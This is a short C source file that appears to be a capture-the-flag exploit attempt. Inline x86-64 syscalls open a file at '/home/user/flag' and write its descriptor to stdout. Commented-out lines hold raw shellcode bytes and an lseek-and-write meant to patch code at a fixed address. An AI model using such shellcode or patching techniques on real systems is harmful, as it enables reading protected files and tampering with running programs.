#define _GNU_SOURCE
#include <unistd.h>
#include <stdint.h>
#include <syscall.h>
#include <sys/stat.h>
#include <sched.h>
void sc() {
    uint32_t flag_fd = 0;
    uint32_t ret = 0;
    uint32_t err = 0;

    //char payload[] = {0x48,0x89,0xfe,0x48,0xc7,0xc0,0x28,0x00,0x00,0x00,0x48,0xc7,0xc7,0x01,0x00,0x00,0x00,0x48,0xc7,0xc2,0x00,0x00,0x00,0x00,0x49,0xc7,0xc2,0x12,0x00,0x00,0x00,0x0f,0x05};
    char not_flag[] = "NOT_FLAG";
    char mem_str[] = "/home/user/flag";

    // write stack to stdout
    asm volatile (
      "syscall"
      : "=a"(ret)
      : "a"(__NR_write), "D"(1), "S"(mem_str), "d"(sizeof(mem_str))
      : "rcx", "memory");

    // open fd for flag file
    asm volatile (
      "syscall"
      : "=a"(flag_fd)
      : "a"(__NR_open), "D"(mem_str), "S"(0), "d"(0)
      : "rcx", "memory");

    // write ret to stdout
    asm volatile (
      "syscall"
      : "=a"(ret)
      : "a"(__NR_write), "D"(1), "S"(&flag_fd), "d"(sizeof(flag_fd))
      : "rcx", "memory");

    asm volatile (
      "syscall"
      : "=a"(ret)
      : "a"(__NR_write), "D"(ret), "S"(not_flag), "d"(sizeof(not_flag))
      : "rcx", "memory");

//    asm volatile (
//      "syscall"
//      : "=a"(ret)
//      : "a"(__NR_lseek), "D"(ret), "S"(0x401b9d), "d"(SEEK_SET)
//      : "rcx", "memory");

//    asm volatile (
//      "syscall"
//      : "=a"(ret)
//      : "a"(__NR_write), "D"(ret), "S"(payload), "d"(sizeof(payload))
//      : "rcx", "memory");

    while(1) {
        asm volatile (
          "syscall"
          : "=a"(ret)
          : "a"(__NR_sched_yield)
          : "rcx", "memory");
    }
}

